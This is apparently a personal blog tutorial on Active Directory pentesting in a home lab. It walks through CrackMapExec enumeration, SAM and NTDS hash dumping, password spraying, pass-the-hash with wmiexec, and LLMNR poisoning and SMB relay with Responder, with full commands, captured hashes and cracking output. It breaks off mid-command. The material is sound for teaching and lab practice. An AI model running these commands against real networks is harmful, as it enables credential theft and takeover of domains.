---
title: Pentesting Active Directory 
date: 2023-08-28 9:00:00
categories: [Apuntes, ActiveDirectory, Tutorial, Windows]
tags: [Active Directory]
author: Waidroc
---

![](/assets/img/AD/ad_titulo.jpg)


Hey! How are you doing?? Today we aren't going to be solving any machine, instead, I am going to be explaining you the basics of `Active Directory`:

- Crackmapexec enumeration
- SMB Relay
- Pass The Hash
- Grabbing info from users
- LDAP Enumeration
- Kerbrute
- Kerberoasting
- AS-REP Roast
- Golden Ticket
- Rubeus - Kerberoasting
- Rubeus - AS-REP Roast
- SCF Files
- Bloodhound & neo4j

# CrackMapExec enumeration

- - -

This is the most used tool for active directory, because it enumerate the most common services on AD.
Even that, is pretty simple to use:

## SMB Enumeration

- - -

`SMB` is a protocol used by Windows systems for file and printer sharing, as well as other functions. It's an essential part of many networks, and one of the most common services that run. There are several tools to enumerate SMB like `smbclient` or `smbmap`. But `crackmapexec` is my favorite one for a lot of reasons. Let's talk about them.

### Network information

- - -

Using `crackmapexec` in its simplest way can give you information as the DC domain, the SMB signature (we will check that on SMB Relay) or computer name:

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
```

These are the Windows computers connected to the network. We can see that the DC (192.168.0.115) has SMB sign, but that doesn't matter if the other connected computers to the DC don't have the same sign.

### Dumping SAM

- - -

If we know the credentials of one user, we could dump the `sam`:

```zsh
❯ cme smb 192.168.0.1/24 -u sponce -p 'Password2' --sam
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\sponce:Password2 
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\sponce:Password2 
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\sponce:Password2 (Pwn3d!)
SMB         192.168.0.149   445    RAMLUX-PC        [+] Dumping SAM hashes
SMB         192.168.0.149   445    RAMLUX-PC        Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.0.149   445    RAMLUX-PC        Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.0.149   445    RAMLUX-PC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.0.149   445    RAMLUX-PC        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
SMB         192.168.0.149   445    RAMLUX-PC        Ramlux:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.0.149   445    RAMLUX-PC        [+] Added 5 SAM hashes to the database
```

Here we can see that the user `sponce` has privileges over `ramlux`, which is pretty dangerous and even more if the password of `sponce` is **very** weak.

### Share enumeration

- - -

```zsh
❯ cme smb 192.168.0.1/24 -u ramlux -p 'Password1' --shares
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\ramlux:Password1 
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\ramlux:Password1 
SMB         192.168.0.116   445    SPONCE-PC        [+] Enumerated shares
SMB         192.168.0.116   445    SPONCE-PC        Share           Permissions     Remark
SMB         192.168.0.116   445    SPONCE-PC        -----           -----------     ------
SMB         192.168.0.116   445    SPONCE-PC        ADMIN$                          Admin remota
SMB         192.168.0.116   445    SPONCE-PC        C$                              Recurso predeterminado
SMB         192.168.0.116   445    SPONCE-PC        IPC$            READ            IPC remota
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] Enumerated shares
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\ramlux:Password1 
SMB         192.168.0.115   445    WIN-FV8S9VU238J  Share           Permissions     Remark
SMB         192.168.0.115   445    WIN-FV8S9VU238J  -----           -----------     ------
SMB         192.168.0.115   445    WIN-FV8S9VU238J  ADMIN$                          Remote Admin
SMB         192.168.0.115   445    WIN-FV8S9VU238J  C$                              Default share
SMB         192.168.0.115   445    WIN-FV8S9VU238J  IPC$            READ            Remote IPC
SMB         192.168.0.115   445    WIN-FV8S9VU238J  NETLOGON        READ            Logon server share 
SMB         192.168.0.115   445    WIN-FV8S9VU238J  SYSVOL          READ            Logon server share 
SMB         192.168.0.149   445    RAMLUX-PC        [+] Enumerated shares
SMB         192.168.0.149   445    RAMLUX-PC        Share           Permissions     Remark
SMB         192.168.0.149   445    RAMLUX-PC        -----           -----------     ------
SMB         192.168.0.149   445    RAMLUX-PC        ADMIN$                          Admin remota
SMB         192.168.0.149   445    RAMLUX-PC        C$                              Recurso predeterminado
SMB         192.168.0.149   445    RAMLUX-PC        IPC$            READ            IPC remota
                                                                                                                                                                                                                                
❯ cme smb 192.168.0.1/24 -u sponce -p 'Password2' --shares
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\sponce:Password2 
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\sponce:Password2 
SMB         192.168.0.116   445    SPONCE-PC        [+] Enumerated shares
SMB         192.168.0.116   445    SPONCE-PC        Share           Permissions     Remark
SMB         192.168.0.116   445    SPONCE-PC        -----           -----------     ------
SMB         192.168.0.116   445    SPONCE-PC        ADMIN$                          Admin remota
SMB         192.168.0.116   445    SPONCE-PC        C$                              Recurso predeterminado
SMB         192.168.0.116   445    SPONCE-PC        IPC$            READ            IPC remota
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] Enumerated shares
SMB         192.168.0.115   445    WIN-FV8S9VU238J  Share           Permissions     Remark
SMB         192.168.0.115   445    WIN-FV8S9VU238J  -----           -----------     ------
SMB         192.168.0.115   445    WIN-FV8S9VU238J  ADMIN$                          Remote Admin
SMB         192.168.0.115   445    WIN-FV8S9VU238J  C$                              Default share
SMB         192.168.0.115   445    WIN-FV8S9VU238J  IPC$            READ            Remote IPC
SMB         192.168.0.115   445    WIN-FV8S9VU238J  NETLOGON        READ            Logon server share 
SMB         192.168.0.115   445    WIN-FV8S9VU238J  SYSVOL          READ            Logon server share 
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\sponce:Password2 (Pwn3d!)
SMB         192.168.0.149   445    RAMLUX-PC        [+] Enumerated shares
SMB         192.168.0.149   445    RAMLUX-PC        Share           Permissions     Remark
SMB         192.168.0.149   445    RAMLUX-PC        -----           -----------     ------
SMB         192.168.0.149   445    RAMLUX-PC        ADMIN$          READ,WRITE      Admin remota
SMB         192.168.0.149   445    RAMLUX-PC        C$              READ,WRITE      Recurso predeterminado
SMB         192.168.0.149   445    RAMLUX-PC        IPC$            READ            IPC remota
```

Here we can see (again) that the user `sponce` has admin privileges over `ramlux`.
This command's output tell us which shares are readable or writable, if there's any.

### Spidering

- - -

But what really steals the point is a module in `crackmapexec` called `spider_plus` . This module goes on and spiders through all the shares and directories inside them recursively and brings you back a clean output that tells every files in every share that is viewable by you. It really takes out all the effort that you need to go in each share and enumerate all directories manually.
The command should look something like this:

```zsh
❯ cme smb 192.168.0.1/24 -u sponce -p 'Password2' -M spider_plus
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\sponce:Password2 
SPIDER_P... 192.168.0.116   445    SPONCE-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.0.116   445    SPONCE-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.0.116   445    SPONCE-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.0.116   445    SPONCE-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.0.116   445    SPONCE-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\sponce:Password2 (Pwn3d!)
SPIDER_P... 192.168.0.149   445    RAMLUX-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.0.149   445    RAMLUX-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.0.149   445    RAMLUX-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.0.149   445    RAMLUX-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.0.149   445    RAMLUX-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\sponce:Password2 
SPIDER_P... 192.168.0.115   445    WIN-FV8S9VU238J  [*] Started spidering plus with option:
SPIDER_P... 192.168.0.115   445    WIN-FV8S9VU238J  [*]        DIR: ['print$']
SPIDER_P... 192.168.0.115   445    WIN-FV8S9VU238J  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.0.115   445    WIN-FV8S9VU238J  [*]       SIZE: 51200
SPIDER_P... 192.168.0.115   445    WIN-FV8S9VU238J  [*]     OUTPUT: /tmp/cme_spider_plus
```

Here we got some results, but nothing really interesting.

### Authentication sprying

- - -

Imagine that you got the Administrator password (the domain administrator), you got it with a SMB Relay attack, right? Well, with `crackmapexec` you could do a password sprying attack to see on which systems you are able to connect:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P@$$w0rd!'
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
```

Of course, because we are DC's Administrator, we can connect to **every** PC. Now we could enable `rdp` on all systems so we could connect to every PC with `pth-winexe`:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P@$$w0rd!' -M rdp -o action=enable
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
RDP         192.168.0.116   445    SPONCE-PC        [+] RDP enabled successfully
RDP         192.168.0.149   445    RAMLUX-PC        [+] RDP enabled successfully
RDP         192.168.0.115   445    WIN-FV8S9VU238J  [+] RDP enabled successfully
```

# Pass The Hash

- - -

Great. Now, we can dump the `ntds` and grab the hash. For this example our target will be `sponce`:

```zsh
❯ cme smb 192.168.0.115 -u Administrator -p 'P@$$w0rd!' --ntds vss
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\Administrator:P@$$w0rd! (Pwn3d!)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.0.115   445    WIN-FV8S9VU238J  Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  WIN-FV8S9VU238J$:1000:aad3b435b51404eeaad3b435b51404ee:4054f61d8984e3d043fe140d9a78fea2:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:acf2d0133c0db165efbca5b44072e10a:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  ruycr4ft.local\ramlux:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  RAMLUX-PC$:1104:aad3b435b51404eeaad3b435b51404ee:ab1687ba2fe14303e8a2db5d154f7aa8:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  ruycr4ft.local\sponce:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  SPONCE-PC$:1107:aad3b435b51404eeaad3b435b51404ee:5b8bfc212d142cedbcd2edcb5937a38a:::
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] Dumped 8 NTDS hashes to /root/.cme/logs/WIN-FV8S9VU238J_192.168.0.115_2023-05-25_164328.ntds of which 5 were added to the database
```

Now, you can grab the target user's hash and connect to the computer with `wmiexec`:

```zsh
❯ wmiexec.py ruycr4ft.local/sponce@192.168.0.149 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
ruycr4ft\sponce
C:\>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   V�nculo: direcci�n IPv6 local. . . : fe80::7024:cc60:3dde:1db6%8
   Direcci�n IPv4. . . . . . . . . . . . . . : 192.168.0.149
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.0.1

C:\>
```

All right!! So we are executing commands as `sponce` on RAMLUX-PC, in which `sponce` has admin privileges.

# SMB Relay

- - -

This is the most common attack, and the first you should start when you audit a `DC`. 

## What is it?

- - -

A `SMB Relay` attack is where us, as attackers, capture a user's `NTLMv2` hash by acting as a non-existing resource the user is trying to access. This kind of attack can be performed with tools such as `responder`.

## Prerequisites

- - -

- Non-signed `SMB`
- It must be performed on a **local network**
- User credentials must have remote login access for example; local admin to the target machine or member of the Domain Administrators group.

## SMB Signing

- - -

### What it does

- - -

SMB signing verifies the origin and authenticity of `SMB` packets. Effectively this stops MITM SMB relay attacks from happening. If this is enabled and required on a machine we will not be able to perform a `SMB relay` attack.
We can check if the `SMB` service is signed using `crackmapexec`.

### PoC

- - -

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.114   445    WIN-23Q9AFM8V9R  [*] Windows 10.0 Build 17763 x64 (name:WIN-23Q9AFM8V9R) (domain:test.local) (signing:True) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
```

Here are two `DC's`:

- `test.local` (192.168.0.114)
- `ruycr4ft.local` (192.168.0.115)

In both cases the `SMB` is not singed, so this attack could be performed like this:

- First, set up your `responder` network poisioner:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.0.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NDF5GOK02C8]
    Responder Domain Name      [97ZB.LOCAL]
    Responder DCE-RPC Port     [45364]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
```

Now, if you enter a non-existing resource in the windows file explorer, your `responder` will authenticate as the non-existing resource:

![](/assets/img/AD/1.png)

In the windows machine, it doesn't look like anything, but if you look at your `responder`:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.0.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-WGLRX6KFSXA]
    Responder Domain Name      [72XV.LOCAL]
    Responder DCE-RPC Port     [46997]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
[*] [MDNS] Poisoned answer sent to 192.168.0.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to 192.168.0.114   for name thisisnotexisting.local
[*] [MDNS] Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting.local
[*] [LLMNR]  Poisoned answer sent to 192.168.0.114 for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to fe80::43b2:5355:d026:2e2a for name thisisnotexisting
[*] [LLMNR]  Poisoned answer sent to 192.168.0.114 for name thisisnotexisting
[SMB] NTLMv2-SSP Client   : fe80::43b2:5355:d026:2e2a
[SMB] NTLMv2-SSP Username : TEST\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::TEST:3fabd80df2a798d1:5CFA7A9518D439D72DE93334446B0E78:01010000000000008096715AB98DD9019F2CE73B69622AA20000000002000800370032005800560001001E00570049004E002D00570047004C005200580036004B00460053005800410004003400570049004E002D00570047004C005200580036004B0046005300580041002E0037003200580056002E004C004F00430041004C000300140037003200580056002E004C004F00430041004C000500140037003200580056002E004C004F00430041004C00070008008096715AB98DD9010600040002000000080030003000000000000000000000000030000058EB90B87185FC51DDCBC7261E23DCE94E13E0B5FC10237908F6DD837C13582E0A0010000000000000000000000000000000000009002C0063006900660073002F007400680069007300690073006E006F0074006500780069007300740069006E0067000000000000000000
```

Great!! We have Administrator's NTLMv2 hash. Now, we could try to crack this hash, but we won't be able to do it because the password is secure. Now, let's try the same thing but in the `ruycr4f.local` DC. Now, to change a little bit, we are not going to use responder, we are going to use `impacket-smbserver`:

![](/assets/img/AD/2.png)

Now, let's check our `responder`:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.0.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-G98QVZWMZJ4]
    Responder Domain Name      [3R0S.LOCAL]
    Responder DCE-RPC Port     [48530]

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 192.168.0.115   for name ruycr4ftagphqpwerug.local
[*] [MDNS] Poisoned answer sent to 192.168.0.115   for name ruycr4ftagphqpwerug.local
[*] [LLMNR]  Poisoned answer sent to 192.168.0.115 for name ruycr4ftagphqpwerug
[*] [LLMNR]  Poisoned answer sent to 192.168.0.115 for name ruycr4ftagphqpwerug
[SMB] NTLMv2-SSP Client   : fe80::1e2e:ac4a:2102:569f
[SMB] NTLMv2-SSP Username : RUYCR4FT\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RUYCR4FT:84cc9122d9316c48:9D34FF6B29164B3E2A9E9ADE37D10914:010100000000000080D0D28C598ED90141B5EB01668B658C0000000002000800330052003000530001001E00570049004E002D00470039003800510056005A0057004D005A004A00340004003400570049004E002D00470039003800510056005A0057004D005A004A0034002E0033005200300053002E004C004F00430041004C000300140033005200300053002E004C004F00430041004C000500140033005200300053002E004C004F00430041004C000700080080D0D28C598ED901060004000200000008003000300000000000000000000000003000003A4DD9718188490BDF219D7B66290306551A69F6C9A7CFF2C5832C8EAFB0C9040A001000000000000000000000000000000000000900300063006900660073002F0072007500790063007200340066007400610067007000680071007000770065007200750067000000000000000000
```

Great!! We can see that the `Administrator` user got authenticated on `ruycr4ft.local`. 
We can save this hash and try to crack it:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@$$w0rd!        (Administrator)     
1g 0:00:00:11 DONE (2023-05-24 16:07) 0.08547g/s 919849p/s 919849c/s 919849C/s PAK2530..P1nkr1ng
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Great! We've been able to crack this password

### Attack (IPv4)

- - -

In some DCs, there are some users that have privileges on other users, just like in this case the user `sponce` is privileged over `ramlux`:

```zsh
❯ cme smb 192.168.0.1/24 -u 'sponce' -p 'Password2'
SMB         192.168.0.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.109   445    SARA             [-] SARA\sponce:Password2 STATUS_LOGON_FAILURE 
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\sponce:Password2 (Pwn3d!)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\sponce:Password2 
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\sponce:Password2 (Pwn3d!)
```

Here we can see that the user `sponce` is privileged over `RAMLUX-PC`. This should be happening because the user `sponce` is on the `Administrators` group on the `RAMLUX-PC`.

To perform this, we would need to do some changes into our `/usr/share/responder/Responder.conf` file. It should look something like this:

![](/assets/img/AD/3.png)

Now, we will use a tool called `ntlmrelayx.py`. This tool provide us the ability to add a `target` file.
The target now is the `RAMLUX-PC`. So, fist of all, we will need to enumerate all the connected computers on the network:

```zsh
❯ cme smb 192.168.0.1/24
